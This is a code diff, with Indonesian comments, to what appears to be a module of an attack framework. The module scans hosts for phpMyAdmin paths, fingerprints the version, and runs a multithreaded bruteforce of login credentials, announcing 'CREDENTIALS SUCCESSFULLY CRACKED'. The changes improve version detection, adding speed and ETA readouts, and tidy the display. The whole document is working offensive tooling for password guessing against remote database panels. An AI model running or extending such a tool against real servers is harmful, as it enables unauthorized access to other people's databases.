@@ -6,6 +6,8 @@ import sys
 import random
 import concurrent.futures
 from queue import Queue
+import re
+import urllib.parse
 
 # Suppress SSL warnings
 try:
@@ -33,6 +35,8 @@ try:
     from rich.text import Text
     from rich.columns import Columns
     from rich.align import Align
+    from rich.live import Live
+    from rich.layout import Layout
     RICH_AVAILABLE = True
     console = Console()
 except ImportError:
@@ -136,7 +140,8 @@ class UltraFastTargetScanner:
         common_paths = [
             "", "/phpmyadmin", "/pma", "/myadmin", "/admin", 
             "/mysql", "/dbadmin", "/PMA", "/phpMyAdmin",
-            "/web/phpmyadmin", "/db/phpmyadmin", "/sql/phpmyadmin"
+            "/web/phpmyadmin", "/db/phpmyadmin", "/sql/phpmyadmin",
+            "/phpMyAdmin-5.1", "/phpMyAdmin-5.0", "/phpMyAdmin-4.9"
         ]
         
         if RICH_AVAILABLE:
@@ -154,7 +159,9 @@ class UltraFastTargetScanner:
                 desc="Scanning Paths",
                 unit="path",
                 ncols=70,
-                bar_format="{l_bar}{bar:30}| {n_fmt}/{total_fmt} paths"
+                bar_format="{l_bar}{bar:30}| {n_fmt}/{total_fmt} paths",
+                position=0,  # Pastikan di position 0
+                leave=False   # Jangan tinggalkan progress bar setelah selesai
             )
         else:
             progress_bar = common_paths
@@ -164,7 +171,6 @@ class UltraFastTargetScanner:
             status_info = self.check_url_status(test_url)
             
             if status_info["accessible"]:
-                status_info.setdefault("version", self.extract_version_from_text(status_info.get("raw_text","") or ""))
                 self.found_paths.append(status_info)
                 if TQDM_AVAILABLE:
                     progress_bar.set_description(f"✅ Found: {path}")
@@ -180,106 +186,125 @@ class UltraFastTargetScanner:
         return self.found_paths
     
     def check_url_status(self, url):
-        """Check status URL"""
+        """Check status URL dengan version detection yang lebih baik"""
         try:
             response = requests.get(
                 url,
                 headers=self.headers,
                 verify=self.ssl_verify,
-                timeout=2,
+                timeout=5,
                 proxies=self.proxies,
                 allow_redirects=True
             )
-            html = response.text or ""
-            version = self.extract_version_from_text(html)
-            if version == "Unknown":
-               try:
-                  r2 = requests.get(f"{url.rstrip('/')}/index.php", headers=self.headers,
-                                   verify=self.ssl_verify, timeout=max(5, self.timeout),
-                                   proxies=self.proxies, allow_redirects=True)
-                  html2 = r2.text or ""
-                  version = self.extract_version_from_text(html2) or version
-                  if version != "Unknown":
-                     html = html2
-               except Exception as e:
-                  pass
-            if version == "Unknown":
-               import re, urllib.parse
-               scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
-               for s in scripts[:8]:  # batasi
-                   try:
-                       script_url = urllib.parse.urljoin(response.url, s)
-                       rsc = requests.get(script_url, headers=self.headers,
-                                         verify=self.ssl_verify, timeout=max(4, self.timeout),
-                                         proxies=self.proxies, allow_redirects=True)
-                       version = self.extract_version_from_text(rsc.text or "") or version
-                       if version != "Unknown":
-                          break
-                   except Exception as e:
-                          continue
-            if version == "Unknown":
-                extras = ["/README", "/README.md", "/CHANGELOG", "/CHANGELOG.md", "/phpmyadmin/README",
-                          "/phpMyAdmin/README", "/setup", "/sql.php"]
-                import urllib.parse
-                for ex in extras:
-                    try:
-                        url_ex = urllib.parse.urljoin(response.url, ex)
-                        r3 = requests.get(url_ex, headers=self.headers,
-                                         verify=self.ssl_verify, timeout=max(4, self.timeout),
-                                         proxies=self.proxies, allow_redirects=True)
-                        version = self.extract_version_from_text(r3.text or "") or version
-                        if version != "Unknown":
-                           break
-                    except Exception as e:
-                           continue
+            
+            html = response.text
+            final_url = response.url
+            
+            # Enhanced version detection dengan multiple methods
+            version = self.detect_phpmyadmin_version(final_url, html, response.headers)
+            
             accessible = response.status_code in [200, 301, 302, 401, 403]
             
             return {
-                "url": url,
+                "url": final_url,
                 "status_code": response.status_code,
                 "accessible": accessible,
-                "ssl": url.startswith("https"),
+                "ssl": final_url.startswith("https"),
                 "server": response.headers.get('Server', 'N/A'),
-                "title": self.extract_title(response.text),
-                "raw_text": html,
-                "version": version or "Unknown",
+                "x_powered_by": response.headers.get('X-Powered-By', 'N/A'),
+                "title": self.extract_title(html),
+                "version": version,
+                "content_length": len(html),
             }
             
-    except Exception as e:
+        except Exception as e:
             return {
                 "url": url, 
                 "status_code": "ERROR", 
                 "accessible": False, 
-                "raw_text": "", 
                 "version": "Unknown",
+                "error": str(e)
             }
+    
+    def detect_phpmyadmin_version(self, url, html, headers):
+        """Detect phpMyAdmin version dengan multiple advanced methods"""
+        version = "Unknown"
+        
+        # Method 1: Check HTML content patterns
+        version = self.extract_version_from_html(html)
+        if version != "Unknown":
+            return version
+        
+        # Method 2: Check URL path patterns
+        version = self.check_url_for_version(url)
+        if version != "Unknown":
+            return version
+        
+        return "Unknown"
+    
+    def extract_version_from_html(self, html):
+        """Extract version dari HTML dengan patterns yang lebih komprehensif"""
+        if not html:
+            return "Unknown"
+        
+        text = html[:300000]
+        
+        patterns = [
+            r'phpMyAdmin[^<]*?([0-9]+\.[0-9]+\.[0-9]+)',
+            r'Version[:\s]*([0-9]+\.[0-9]+\.[0-9]+)',
+            r'v([0-9]+\.[0-9]+\.[0-9]+)',
+            r'phpMyAdmin[^0-9]*([0-9]+\.[0-9]+)',
+            r'PMA_VERSION[\s]*=[\s]*["\']([0-9\.]+)["\']',
+            r'<meta[^>]*content=["\'][^"\']*phpMyAdmin[^"\']*([0-9\.]+)',
+            r'<title>[^<]*phpMyAdmin[^<]*([0-9\.]+)',
+        ]
+        
+        for pattern in patterns:
+            try:
+                matches = re.findall(pattern, text, re.IGNORECASE)
+                for match in matches:
+                    if self.is_valid_version(match):
+                        return match
+            except:
+                continue
+        
+        return "Unknown"
+    
+    def check_url_for_version(self, url):
+        """Check URL pattern untuk version clues"""
+        patterns = [
+            r'phpmyadmin[-\s]*([0-9]+\.[0-9]+\.[0-9]+)',
+            r'phpmyadmin[-\s]*([0-9]+\.[0-9]+)',
+            r'pma[-\s]*([0-9]+\.[0-9]+)',
+            r'phpMyAdmin-([0-9]+\.[0-9]+)'
+        ]
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, url, re.IGNORECASE)
+            for match in matches:
+                if self.is_valid_version(match):
+                    return match
+        
+        return "Unknown"
+    
+    def is_valid_version(self, version_str):
+        """Validate jika string adalah version yang valid"""
+        if not version_str:
+            return False
+        
+        if re.match(r'^\d+\.\d+(\.\d+)?$', version_str):
+            parts = version_str.split('.')
+            if all(0 <= int(part) < 1000 for part in parts if part.isdigit()):
+                major_version = int(parts[0])
+                if 2 <= major_version <= 5:
+                    return True
+        
+        return False
     
     def extract_title(self, html):
         """Extract title dari HTML"""
-        import re
         title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
         return title_match.group(1) if title_match else "No Title"
-   
-    def extract_version_from_text(self, html):
-        import re
-        text = (html or "")[:200000]  # batasi untuk performa
-
-        m = re.search(r'phpmyadmin[\s\-:]*v?([\d]+\.[\d]+(?:\.[\d]+)?)', text, re.IGNORECASE)
-        if m:
-            return m.group(1)
-        m = re.search(r'<!--\s*phpMyAdmin\s*([\d]+\.[\d]+(?:\.[\d]+)?)\s*-->', text, re.IGNORECASE)
-        if m:
-            return m.group(1)
-        m = re.search(r'var\s+(?:pma_version|pmaVersion|PMA_VERSION)\s*[:=]\s*[\'"]([\d\.]+)[\'"]', text, re.IGNORECASE)
-        if m:
-            return m.group(1)
-        m = re.search(r'<meta[^>]+content=["\'][^"\']*phpmyadmin[^"\']*([\d]+\.[\d]+(?:\.[\d]+)?)[^"\']*["\']', text, re.IGNORECASE)
-        if m:
-            return m.group(1)
-        m = re.search(r'phpMyAdmin[^A-Za-z0-9]*?([\d]+\.[\d]+(?:\.[\d]+)?)', text, re.IGNORECASE)
-        if m:
-            return m.group(1)
-        return "Unknown"
     
     def display_scan_results(self):
         """Display hasil scanning dengan panel"""
@@ -292,27 +317,33 @@ class UltraFastTargetScanner:
             show_header=True, 
             header_style="bold magenta"
         )
-        table.add_column("Status", style="bold", width=8)
-        table.add_column("URL", style="cyan", overflow="fold")
-        table.add_column("Code", justify="center", width=6)
-        table.add_column("Server", style="yellow", width=15)
-        table.add_column("SSL", justify="center", width=4)
-        table.add_column("Version", style="bold green", justify="center", width=12)
-
-        table.add_column("Title", style="green", width=25)
+        table.add_column("Status", style="bold", width=30, overflow="fold")
+        table.add_column("URL", style="cyan", overflow="fold", width=30)
+        table.add_column("Code", justify="center", width=30, overflow="fold")
+        table.add_column("Server", style="yellow", width=30, overflow="fold")
+        table.add_column("SSL", justify="center", width=30)
+        table.add_column("Version", style="bold green", justify="center", width=30, overflow="fold")
+        #table.add_column("Title", style="green", width=25)
         
         for result in self.found_paths:
             status_emoji = self.get_status_emoji(result['status_code'])
             ssl_icon = "🔐" if result["ssl"] else "🌐"
             status_code = result['status_code']
             version = result.get("version", "Unknown")
+            
+            version_display = version
+            if version != "Unknown":
+                version_display = f"[green]{version}[/green]"
+            else:
+                version_display = f"[yellow]{version}[/yellow]"
+            
             table.add_row(
                 f"{status_emoji}",
                 f"{result['url']}",
                 f"[bold]{status_code}[/bold]",
                 result['server'][:15],
                 ssl_icon,
-                str(version),
+                version_display,
                 result['title'][:25] if result['title'] != "No Title" else "No Title"
             )
         
@@ -342,7 +373,7 @@ class UltraFastLoginChecker:
         text = response.text.lower()
         
         # Very quick success checks
-        if any(indicator in text for indicator in ["mainframeset", "navigation.php", "server version"]):
+        if any(indicator in text for indicator in ["mainframeset", "navigation.php", "server version", "frameborder"]):
             return True
         
         # Very quick failure checks  
@@ -364,6 +395,8 @@ class UltraFastPhpMyAdminBruteforce:
             "found_credentials": [],
             "attempts": 0,
             "successful_attempts": 0,
+            "start_time": None,
+            "current_speed": 0
         }
         self.stop_event = threading.Event()
         self.credentials_found = False
@@ -508,13 +541,18 @@ class UltraFastPhpMyAdminBruteforce:
                 total=self.total_attempts,
                 desc="Bruteforcing",
                 unit="attempt",
-                ncols=80,
-                bar_format="{l_bar}{bar:40}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
+                #ncols=100,
+                dynamic_ncols=True,
+                bar_format="{l_bar}{bar:20}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]",
+                position=0,  # PASTIKAN di position 0
+                leave=True   # Biarkan progress bar setelah selesai
             )
+            # Tambah postfix untuk info tambahan
+            self.progress_bar.set_postfix_str("Starting...")
         else:
             console.print(f"🔄 Starting bruteforce with {self.total_attempts:,} combinations...")
         
-        start_time = time.time()
+        self.results["start_time"] = time.time()
         
         # Start worker threads
         threads = []
@@ -528,13 +566,35 @@ class UltraFastPhpMyAdminBruteforce:
             thread.start()
             threads.append(thread)
         
-        # Monitor progress
+        # Monitor progress dengan update real-time
+        last_attempts = 0
+        last_time = time.time()
+        
         try:
             while (not self.stop_event.is_set() and 
                    self.results["attempts"] < self.total_attempts and
                    not self.credentials_found):
                 
-                time.sleep(0.1)
+                time.sleep(0.5)  # Update setiap 0.5 detik
+                
+                # Calculate current speed
+                current_time = time.time()
+                attempts_diff = self.results["attempts"] - last_attempts
+                time_diff = current_time - last_time
+                
+                if time_diff > 0:
+                    current_speed = attempts_diff / time_diff
+                    self.results["current_speed"] = current_speed
+                    
+                    # Update progress bar postfix
+                    if TQDM_AVAILABLE and self.progress_bar:
+                        elapsed = current_time - self.results["start_time"]
+                        eta = (self.total_attempts - self.results["attempts"]) / current_speed if current_speed > 0 else 0
+                        postfix = f"Speed: {current_speed:,.0f}/s | ETA: {eta:.0f}s"
+                        self.progress_bar.set_postfix_str(postfix)
+                
+                last_attempts = self.results["attempts"]
+                last_time = current_time
                 
                 # Check jika semua kombinasi sudah dicoba
                 if self.credential_queue.empty():
@@ -550,7 +610,7 @@ class UltraFastPhpMyAdminBruteforce:
         for thread in threads:
             thread.join(timeout=2)
         
-        elapsed_time = time.time() - start_time
+        elapsed_time = time.time() - self.results["start_time"]
         
         if TQDM_AVAILABLE and self.progress_bar:
             self.progress_bar.close()
@@ -559,8 +619,9 @@ class UltraFastPhpMyAdminBruteforce:
             attempts_per_second = self.results["attempts"] / elapsed_time if elapsed_time > 0 else 0
             console.print(Panel(
                 f"⏰ [cyan]Execution Time:[/cyan] {elapsed_time:.2f} seconds\n"
-                f"📈 [green]Speed:[/green] {attempts_per_second:,.1f} attempts/second\n"
-                f"🎯 [yellow]Status:[/yellow] {'COMPLETED' if not self.credentials_found else 'CREDENTIALS FOUND'}",
+                f"📈 [green]Average Speed:[/green] {attempts_per_second:,.1f} attempts/second\n"
+                f"📊 [yellow]Peak Speed:[/yellow] {self.results['current_speed']:,.1f} attempts/second\n"
+                f"🎯 [bold magenta]Status:[/bold magenta] {'COMPLETED' if not self.credentials_found else 'CREDENTIALS FOUND'}",
                 title="📊 EXECUTION SUMMARY",
                 border_style="cyan",
                 padding=(1, 2)
@@ -592,7 +653,11 @@ class UltraFastPhpMyAdminBruteforce:
                     self.stop_event.set()
                     
                     if RICH_AVAILABLE:
-                        console.print("\n")
+                        # Clear progress bar area sebelum print success
+                        if TQDM_AVAILABLE and self.progress_bar:
+                            self.progress_bar.clear()
+                        
+                        console.print("\n" + "="*70)
                         success_panel = Panel(
                             f"🎉 [bold green]CREDENTIALS SUCCESSFULLY CRACKED![/bold green]\n\n"
                             f"👤 [cyan]Username:[/cyan] {username}\n"
@@ -604,9 +669,10 @@ class UltraFastPhpMyAdminBruteforce:
                             padding=(2, 3)
                         )
                         console.print(success_panel)
+                        console.print("="*70)
             
-            # Update progress bar
-            if TQDM_AVAILABLE and self.progress_bar:
+            # Update progress bar - HANYA di worker utama
+            if TQDM_AVAILABLE and self.progress_bar and not self.credentials_found:
                 self.progress_bar.update(1)
             
             # Delay
@@ -658,9 +724,8 @@ class UltraFastPhpMyAdminBruteforce:
         if not RICH_AVAILABLE:
             return
             
-        console.print("\n" + "="*60)
+        #console.print("\n" + "="*60)
         
-        # PERBAIKAN: String yang benar
         summary_content = (
             f"🎯 [bold cyan]Target:[/bold cyan] {self.options.get('TARGET')}\n"
             f"⏰ [bold yellow]Total Attempts:[/bold yellow] {self.results['attempts']:,}\n"
@@ -708,7 +773,7 @@ class UltraFastPhpMyAdminBruteforce:
                 padding=(1, 2)
             ))
         
-        console.print("="*60)
+        #console.print("="*60)
 
 def run(session, options):
     """Main function"""
